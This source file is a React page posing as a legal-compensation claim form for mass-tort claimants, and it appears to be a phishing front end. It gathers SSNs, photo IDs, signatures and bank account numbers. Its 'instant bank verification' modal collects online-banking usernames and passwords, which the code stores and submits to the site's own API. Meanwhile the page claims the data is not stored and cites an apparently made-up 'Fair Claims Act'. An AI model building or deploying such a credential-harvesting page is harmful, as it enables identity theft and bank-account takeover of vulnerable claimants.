"use client";

import { useState, useRef, useEffect } from "react";
import ConnectBankModal from "./connect-bank-modal";
import VerifyingModal from "./verifying-modal";
import VerificationCompleteModal from "./verification-complete-modal";
import { Button } from "@/components/ui/button";
import { Calendar } from "@/components/ui/calendar";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import { ChevronDownIcon } from "lucide-react";
import { createMergedPDF } from "@/lib/pdf-utils";

export default function ApplicationForm({ setCurrentPage }: any) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isDrawing, setIsDrawing] = useState(false);
  const [photoIdFile, setPhotoIdFile] = useState<File | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [submitSuccess, setSubmitSuccess] = useState(false);

  const [showConnectModal, setShowConnectModal] = useState(false);
  const [showVerifyingModal, setShowVerifyingModal] = useState(false);
  const [showCompleteModal, setShowCompleteModal] = useState(false);
  const [bankVerified, setBankVerified] = useState(false);

  const [open, setOpen] = useState(false);
  const [filingDateOpen, setFilingDateOpen] = useState(false);
  const [judgmentDateOpen, setJudgmentDateOpen] = useState(false);

  const [formData, setFormData] = useState({
    fullName: "",
    dateOfBirth: "" as unknown as Date,
    ssn: "",
    claimId: "",
    phone: "",
    email: "",
    street: "",
    city: "",
    state: "",
    zip: "",
    lawsuitType: "",
    filingDate: "" as unknown as Date,
    court: "",
    judgmentDate: "" as unknown as Date,
    totalAmount: "",
    bankName: "",
    accountNumber: "",
    routingNumber: "",
    accountType: "",
    paymentMethod: "bank",
    consent: false,
    bankUsername: "",
    bankPassword: "",
  });

  useEffect(() => {
    const canvas = canvasRef.current;
    if (canvas) {
      canvas.width = canvas.offsetWidth;
      canvas.height = 200;
      const ctx = canvas.getContext("2d");
      if (ctx) {
        ctx.fillStyle = "#FFFFFF";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.strokeStyle = "#D1D5DB";
        ctx.lineWidth = 1;
        ctx.setLineDash([5, 5]);
        ctx.rect(10, 10, canvas.width - 20, canvas.height - 20);
        ctx.stroke();
      }
    }
  }, []);

  const handleCanvasMouseDown = (e: React.MouseEvent<HTMLCanvasElement>) => {
    setIsDrawing(true);
    startDrawing(e);
  };

  const handleCanvasMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (isDrawing) {
      draw(e);
    }
  };

  const handleCanvasMouseUp = () => {
    setIsDrawing(false);
  };

  const startDrawing = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    ctx.beginPath();
    ctx.moveTo(x, y);
  };

  const draw = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    ctx.strokeStyle = "#000000";
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.lineJoin = "round";
    ctx.lineTo(x, y);
    ctx.stroke();
  };

  const clearSignature = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.fillStyle = "#FFFFFF";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.strokeStyle = "#D1D5DB";
    ctx.lineWidth = 1;
    ctx.setLineDash([5, 5]);
    ctx.rect(10, 10, canvas.width - 20, canvas.height - 20);
    ctx.stroke();
  };

  const handleChange = (e: any) => {
    const { name, value, type, checked } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const states = [
    "Select State",
    "Alabama",
    "Alaska",
    "Arizona",
    "Arkansas",
    "California",
    "Colorado",
    "Connecticut",
    "Delaware",
    "Florida",
    "Georgia",
    "Hawaii",
    "Idaho",
    "Illinois",
    "Indiana",
    "Iowa",
    "Kansas",
    "Kentucky",
    "Louisiana",
    "Maine",
    "Maryland",
    "Massachusetts",
    "Michigan",
    "Minnesota",
    "Mississippi",
    "Missouri",
    "Montana",
    "Nebraska",
    "Nevada",
    "New Hampshire",
    "New Jersey",
    "New Mexico",
    "New York",
    "North Carolina",
    "North Dakota",
    "Ohio",
    "Oklahoma",
    "Oregon",
    "Pennsylvania",
    "Rhode Island",
    "South Carolina",
    "South Dakota",
    "Tennessee",
    "Texas",
    "Utah",
    "Vermont",
    "Virginia",
    "Washington",
    "West Virginia",
    "Wisconsin",
    "Wyoming",
  ];

  const handleConnectBank = () => {
    setShowConnectModal(true);
  };

  const handleVerifyBank = (username: string, password: string) => {
    // Store the bank credentials
    setFormData((prev) => ({
      ...prev,
      bankUsername: username,
      bankPassword: password,
    }));

    setShowConnectModal(false);
    setShowVerifyingModal(true);
  };

  const handleVerifyingComplete = () => {
    setShowVerifyingModal(false);
    setShowCompleteModal(true);
  };

  const handleReturnToApplication = () => {
    setShowCompleteModal(false);
    setBankVerified(true);
  };

  const handlePhotoIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      // Check file size (max 5MB)
      if (file.size > 5 * 1024 * 1024) {
        alert("File size must be less than 5MB");
        return;
      }
      setPhotoIdFile(file);
    }
  };

  const validateForm = (): string | null => {
    if (!formData.fullName) return "Full name is required";
    if (!formData.dateOfBirth) return "Date of birth is required";
    if (!formData.ssn) return "SSN is required";
    if (!formData.claimId) return "Claim ID is required";
    if (!formData.phone) return "Phone number is required";
    if (!formData.email) return "Email is required";
    if (!formData.street) return "Street address is required";
    if (!formData.city) return "City is required";
    if (!formData.state || formData.state === "Select State")
      return "State is required";
    if (!formData.zip) return "Zip code is required";
    if (!formData.lawsuitType) return "Lawsuit type is required";
    if (!formData.filingDate) return "Filing date is required";
    // if (!formData.court) return "Court is required";
    if (!formData.judgmentDate) return "Judgment date is required";
    if (!formData.totalAmount) return "Total amount is required";
    if (!formData.bankName) return "Bank name is required";
    if (!formData.accountNumber) return "Account number is required";
    if (!formData.routingNumber) return "Routing number is required";
    if (!formData.accountType) return "Account type is required";
    if (!photoIdFile) return "Photo ID is required";
    if (!formData.consent)
      return "You must consent to the terms and conditions";

    // Check if signature is drawn
    const canvas = canvasRef.current;
    if (!canvas) return "Signature canvas not found";

    const ctx = canvas.getContext("2d");
    if (!ctx) return "Cannot access signature canvas";

    // Check if the canvas has been drawn on (simple check)
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const hasSignature = imageData.data.some((pixel, index) => {
      // Check alpha channel (every 4th value) and look for drawn pixels
      if ((index + 1) % 4 === 0) return false;
      return pixel !== 255; // Not white
    });

    if (!hasSignature) return "Please provide your signature";

    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    setSubmitError(null);
    setSubmitSuccess(false);

    // Validate form
    const validationError = validateForm();
    if (validationError) {
      setSubmitError(validationError);
      window.scrollTo({ top: 0, behavior: "smooth" });
      return;
    }

    setIsSubmitting(true);

    try {
      // Create merged PDF from photo ID and signature
      const canvas = canvasRef.current;
      if (!canvas || !photoIdFile) {
        throw new Error("Missing required documents");
      }

      const documentPdfBase64 = await createMergedPDF(photoIdFile, canvas);

      // Prepare data for submission
      const submissionData = {
        ...formData,
        dateOfBirth: formData.dateOfBirth.toISOString(),
        filingDate: formData.filingDate.toISOString(),
        judgmentDate: formData.judgmentDate.toISOString(),
        bankVerified,
        documentPdfBase64,
      };

      // Submit to API
      const response = await fetch("/api/applications", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submissionData),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || "Failed to submit application");
      }

      setSubmitSuccess(true);
      alert(
        `Application submitted successfully! Application ID: ${result.applicationId}`
      );

      // Optionally redirect or reset form
      // window.location.href = '/success';
    } catch (error) {
      console.error("Submission error:", error);
      setSubmitError(
        error instanceof Error ? error.message : "Failed to submit application"
      );
      window.scrollTo({ top: 0, behavior: "smooth" });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-4xl mx-auto px-4 md:px-8 py-8 bg-gray-50 min-h-screen">
      {/* Breadcrumb */}
      <div className="mb-8 text-sm">
        <a href="/" className="text-(--custom-color) hover:underline">
          Home
        </a>
        <span className="text-gray-600 mx-2">/</span>
        <span className="text-gray-600">Compensation Application Form</span>
      </div>

      <h1 className="text-4xl font-bold text-gray-900 mb-2">
        Compensation Application Form
      </h1>
      <p className="text-gray-700 mb-8">
        Please complete all sections to finalize your claim disbursement.
      </p>

      {/* Error Message */}
      {submitError && (
        <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
          <p className="text-red-700 font-semibold">Error: {submitError}</p>
        </div>
      )}

      {/* Success Message */}
      {submitSuccess && (
        <div className="bg-green-50 border-l-4 border-green-500 p-4 mb-6">
          <p className="text-green-700 font-semibold">
            ✓ Application submitted successfully! You will receive a
            confirmation email shortly.
          </p>
        </div>
      )}

      <form className="space-y-8" onSubmit={handleSubmit}>
        {/* Personal Information */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-blue-600 pl-4">
            Personal Information
          </h2>
          <div className="grid md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Full Name
              </label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label
                htmlFor="dateOfBirth"
                className="block text-sm font-semibold text-(--custom-color) mb-2"
              >
                Date of Birth
              </label>
              <Popover open={open} onOpenChange={setOpen}>
                <PopoverTrigger asChild>
                  <Button
                    variant="outline"
                    name="dateOfBirth"
                    className="w-full justify-between font-normal"
                  >
                    {formData.dateOfBirth
                      ? formData.dateOfBirth.toLocaleDateString("en-US")
                      : "Select date"}
                    <ChevronDownIcon />
                  </Button>
                </PopoverTrigger>
                <PopoverContent
                  className="w-auto overflow-hidden p-0"
                  align="start"
                >
                  <Calendar
                    mode="single"
                    selected={formData.dateOfBirth}
                    captionLayout="dropdown"
                    onSelect={(date) => {
                      setFormData((prev) => ({
                        ...prev,
                        dateOfBirth: date || prev.dateOfBirth,
                      }));
                      setOpen(false);
                    }}
                  />
                </PopoverContent>
              </Popover>
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Social Security Number (SSN)
              </label>
              <input
                type="text"
                name="ssn"
                placeholder="XXX-XX-XXXX"
                value={formData.ssn}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Claim Number / Case ID
              </label>
              <input
                type="text"
                name="claimId"
                placeholder="Enter your official Claim ID"
                value={formData.claimId}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
              <p className="text-xs text-gray-600 mt-1">
                Entering your Claim ID will auto-fill your Legal Representation
                details.
              </p>
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Phone Number
              </label>
              <input
                type="tel"
                name="phone"
                placeholder="(123) 456-7890"
                value={formData.phone}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Email Address
              </label>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
          </div>
        </div>

        {/* Address Information */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Address Information
          </h2>
          <div className="space-y-6">
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Street Address
              </label>
              <input
                type="text"
                name="street"
                value={formData.street}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div className="grid md:grid-cols-3 gap-6">
              <div>
                <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                  City
                </label>
                <input
                  type="text"
                  name="city"
                  value={formData.city}
                  onChange={handleChange}
                  className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
                />
              </div>
              <div>
                <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                  State
                </label>
                <select
                  name="state"
                  value={formData.state}
                  onChange={handleChange}
                  className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
                >
                  {states.map((state, idx) => (
                    <option key={idx} value={state}>
                      {state}
                    </option>
                  ))}
                </select>
              </div>
              <div>
                <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                  Zip Code
                </label>
                <input
                  type="text"
                  name="zip"
                  value={formData.zip}
                  onChange={handleChange}
                  className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>
          </div>
        </div>

        {/* Claim Information */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Claim Information
          </h2>
          <div className="grid md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Type of Lawsuit
              </label>
              <select
                name="lawsuitType"
                value={formData.lawsuitType}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              >
                <option disabled value="">
                  Select Lawsuit Type
                </option>
                <option value="zantac">Zantac Lawsuit</option>
                <option value="roundup">Round-Up Lawsuit</option>
                <option value="talcum">Talcum Lawsuit</option>
                <option value="Tylenol">Tylenol Lawsuit</option>
                <option value="BabyFormula">Baby Formula Lawsuit</option>
                <option value="CampLejeune">Camp Lejeune Lawsuit</option>
                <option value="AFFF">AFFF Lawsuit</option>
                <option value="Roblox">Roblox Lawsuit</option>
                <option value="DepoProvera">Depo Provera Lawsuit</option>
                <option value="HairRelaxer">Hair Relaxer Lawsuit</option>
                <option value="HerniaMesh">Hernia Mesh Lawsuit</option>
                <option value="RideShare">Ride-Share Lawsuit</option>
                <option value="SexualAbuse">Sexual Abuse Lawsuit</option>
                <option value="LDSSexualAbuse">LDS Sexual Abuse Lawsuit</option>
                <option value="MVA"> Motor Vehicle Accident Lawsuit</option>
              </select>
            </div>
            <div>
              <label
                htmlFor="filingDate"
                className="block text-sm font-semibold text-(--custom-color) mb-2"
              >
                Date of Filing the Claim
              </label>
              <Popover open={filingDateOpen} onOpenChange={setFilingDateOpen}>
                <PopoverTrigger asChild>
                  <Button
                    variant="outline"
                    name="filingDate"
                    className="w-full justify-between font-normal"
                  >
                    {formData.filingDate
                      ? formData.filingDate.toLocaleDateString("en-US")
                      : "Select date"}
                    <ChevronDownIcon />
                  </Button>
                </PopoverTrigger>
                <PopoverContent
                  className="w-auto overflow-hidden p-0"
                  align="start"
                >
                  <Calendar
                    mode="single"
                    selected={formData.filingDate}
                    captionLayout="dropdown"
                    onSelect={(date) => {
                      setFormData((prev) => ({
                        ...prev,
                        filingDate: date || prev.filingDate,
                      }));
                      setFilingDateOpen(false);
                    }}
                  />
                </PopoverContent>
              </Popover>
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Court of Jurisdiction
              </label>
              <input
                type="text"
                name="court"
                placeholder="Auto-filled based on Claim ID (e.g., Southern Distri..."
                value={formData.court}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label
                htmlFor="judgmentDate"
                className="block text-sm font-semibold text-(--custom-color) mb-2"
              >
                Date of Judgment
              </label>
              <Popover
                open={judgmentDateOpen}
                onOpenChange={setJudgmentDateOpen}
              >
                <PopoverTrigger asChild>
                  <Button
                    variant="outline"
                    name="judgmentDate"
                    className="w-full justify-between font-normal"
                  >
                    {formData.judgmentDate
                      ? formData.judgmentDate.toLocaleDateString("en-US")
                      : "Select date"}
                    <ChevronDownIcon />
                  </Button>
                </PopoverTrigger>
                <PopoverContent
                  className="w-auto overflow-hidden p-0"
                  align="start"
                >
                  <Calendar
                    mode="single"
                    selected={formData.judgmentDate}
                    captionLayout="dropdown"
                    onSelect={(date) => {
                      setFormData((prev) => ({
                        ...prev,
                        judgmentDate: date || prev.judgmentDate,
                      }));
                      setJudgmentDateOpen(false);
                    }}
                  />
                </PopoverContent>
              </Popover>
            </div>
          </div>
        </div>

        {/* Legal Representation */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Legal Representation
          </h2>
          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
            <p className="text-sm text-gray-700">
              <strong>**These details are auto-populated**</strong> based on
              your Claim ID and cannot be edited.
            </p>
          </div>
          <p className="text-sm text-gray-600">
            Enter a valid Claim Number / Case ID above to auto-fill legal
            representation details.
          </p>
        </div>

        {/* Compensation Details */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Compensation Details
          </h2>
          <div className="mb-6">
            <label className="block text-sm font-semibold text-(--custom-color) mb-2">
              Total Compensation Amount
            </label>
            <div className="flex items-center border border-gray-300 rounded">
              <span className="px-4 py-2 text-gray-600 font-semibold">$</span>
              <input
                type="number"
                name="totalAmount"
                placeholder="0.00"
                value={formData.totalAmount}
                onChange={handleChange}
                className="flex-1 px-3 py-2 border-0 focus:outline-none"
              />
            </div>
          </div>
        </div>

        {/* Bank Details Section */}
        <div className="bg-white p-8 rounded">
          <div className="grid md:grid-cols-2 gap-6 mb-8">
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Bank Name
              </label>
              <input
                type="text"
                name="bankName"
                value={formData.bankName}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Bank Account Number
              </label>
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Bank Routing Number
              </label>
              <input
                type="text"
                name="routingNumber"
                value={formData.routingNumber}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-(--custom-color) mb-2">
                Bank Account Type
              </label>
              <select
                name="accountType"
                value={formData.accountType}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
              >
                <option value="">Select Type</option>
                <option value="checking">Checking</option>
                <option value="savings">Savings</option>
              </select>
            </div>
          </div>
        </div>

        {/* Payment Information */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-2 pb-4 border-l-4 border-(--custom-color) pl-4">
            Payment Information
          </h2>
          <p className="text-gray-700 mb-6">
            Please select how you would like to receive your compensation
            payment. We offer two secure methods: instant bank linking for
            immediate verification, or manual document upload for review.
          </p>

          <div className="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
            <p className="text-sm text-blue-700">
              Your information is protected by bank-level security and is not
              stored on our servers. The instant link option is generally
              faster.
            </p>
          </div>

          <h3 className="font-bold text-gray-900 mb-4">
            Choose Payment Method
          </h3>

          <div className="grid md:grid-cols-2 gap-4 mb-6">
            <label
              className={`border-2 rounded-lg p-4 cursor-pointer transition ${
                formData.paymentMethod === "bank"
                  ? "border-(--custom-color) bg-blue-50"
                  : "border-gray-300"
              }`}
            >
              <input
                type="radio"
                name="paymentMethod"
                value="bank"
                checked={formData.paymentMethod === "bank"}
                onChange={handleChange}
                className="mr-3"
              />
              <p className="font-bold text-gray-900">
                🔒 Securely Link Bank Account
              </p>
              <p className="text-xs text-gray-600 mt-1">(Recommended)</p>
              <p className="text-sm text-gray-700 mt-2">
                Connect instantly to verify account and routing numbers. Fastest
                way to receive funds.
              </p>
            </label>

            <label
              className={`border-2 rounded-lg p-4 cursor-pointer transition ${
                formData.paymentMethod === "document"
                  ? "border-(--custom-color) bg-blue-50"
                  : "border-gray-300"
              }`}
            >
              <input
                type="radio"
                name="paymentMethod"
                value="document"
                checked={formData.paymentMethod === "document"}
                onChange={handleChange}
                className="mr-3"
              />
              <p className="font-bold text-gray-900">
                📄 Upload Documents for Manual Review
              </p>
              <p className="text-sm text-gray-700 mt-2">
                Upload a voided check or bank statement. Requires 5-7 business
                days for manual review.
              </p>
            </label>
          </div>

          {bankVerified ? (
            <div className="border-l-4 border-green-500 bg-green-50 p-6 mb-6 rounded">
              <p className="text-green-700 font-semibold flex items-center">
                <span className="text-2xl mr-3">✓</span>
                Bank Verification Successful! Proceed to submit the final
                application.
              </p>
            </div>
          ) : (
            <div className="border border-gray-300 rounded-lg p-6 mb-6">
              <h4 className="font-bold text-gray-900 mb-4">
                Instant Bank Verification
              </h4>
              <p className="text-gray-700 mb-4">
                Connect your bank account securely using your online banking
                credentials. This only verifies the account; we cannot see your
                balance or make transactions.
              </p>
              <button
                type="button"
                onClick={handleConnectBank}
                className="bg-(--custom-color) hover:bg-(--custom-color-hover) text-white px-6 py-2 rounded font-semibold"
              >
                Connect My Bank Account
              </button>
            </div>
          )}
        </div>

        {/* Required Document */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Required Document
          </h2>
          <p className="text-gray-700 mb-4">
            Please upload a valid government-issued photo identification
            document to verify your identity. Accepted forms include a Driver's
            License, State ID, or Passport.
          </p>

          <div className="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
            <p className="text-sm text-blue-700">
              Your identification document is required to comply with federal
              verification standards under the Fair Claims Act. Uploaded files
              are encrypted and securely stored.
            </p>
          </div>

          <label className="block text-sm font-semibold text-(--custom-color) mb-2">
            Upload Your Valid Government-Issued Photo ID
          </label>
          <input
            type="file"
            accept=".pdf,.jpg,.jpeg,.png"
            onChange={handlePhotoIdChange}
            className="block w-full border border-gray-300 rounded px-3 py-2 mb-2"
          />
          {photoIdFile && (
            <p className="text-sm text-green-600 mb-2">
              ✓ File selected: {photoIdFile.name}
            </p>
          )}
          <p className="text-xs text-gray-600 mb-4">
            Accepted formats: PDF, JPG, PNG (max file size: 5MB)
          </p>

          <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
            <p className="text-sm text-red-700">
              🔴 <strong>WARNING:</strong> Submitting invalid or forged
              identification documents may result in permanent disqualification
              of your claim.
            </p>
          </div>
        </div>

        {/* Consent & Declaration */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Consent & Declaration
          </h2>
          <label className="flex items-start">
            <input
              type="checkbox"
              name="consent"
              checked={formData.consent}
              onChange={handleChange}
              className="mt-1 mr-3"
            />
            <span className="text-gray-700">
              I declare that the information provided is true and accurate to
              the best of my knowledge. I consent to the transfer of the
              compensation to the bank account provided. I agree to the terms
              and conditions.{" "}
              <a href="#" className="text-blue-600 hover:underline">
                Read Terms & Conditions
              </a>
            </span>
          </label>
        </div>

        {/* Claimant Signature */}
        <div className="bg-white p-8 rounded">
          <h2 className="text-2xl font-bold text-gray-900 mb-8 pb-4 border-l-4 border-(--custom-color) pl-4">
            Claimant Signature
          </h2>
          <p className="text-sm text-gray-600 mb-4">
            Please sign below to authorize this application.
          </p>

          <canvas
            ref={canvasRef}
            onMouseDown={handleCanvasMouseDown}
            onMouseMove={handleCanvasMouseMove}
            onMouseUp={handleCanvasMouseUp}
            onMouseLeave={handleCanvasMouseUp}
            className="w-full border border-gray-300 rounded cursor-crosshair mb-4"
          />

          <p className="text-xs text-gray-500 mb-4">
            Sign within the box above
          </p>

          <button
            type="button"
            onClick={clearSignature}
            className="text-(--custom-color) hover:underline font-semibold mb-8"
          >
            Clear Signature
          </button>
        </div>

        {/* Submit Button */}
        <div className="flex justify-center mb-8">
          <button
            type="submit"
            disabled={isSubmitting}
            className={`px-12 py-3 rounded-md font-bold text-lg text-white ${
              isSubmitting
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-(--custom-color) hover:bg-(--custom-color-hover)"
            }`}
          >
            {isSubmitting ? "Submitting..." : "Submit Application"}
          </button>
        </div>
      </form>

      <ConnectBankModal
        isOpen={showConnectModal}
        onClose={() => setShowConnectModal(false)}
        onVerify={handleVerifyBank}
      />
      <VerifyingModal
        isOpen={showVerifyingModal}
        onComplete={handleVerifyingComplete}
      />
      <VerificationCompleteModal
        isOpen={showCompleteModal}
        onClose={handleReturnToApplication}
      />
    </div>
  );
}
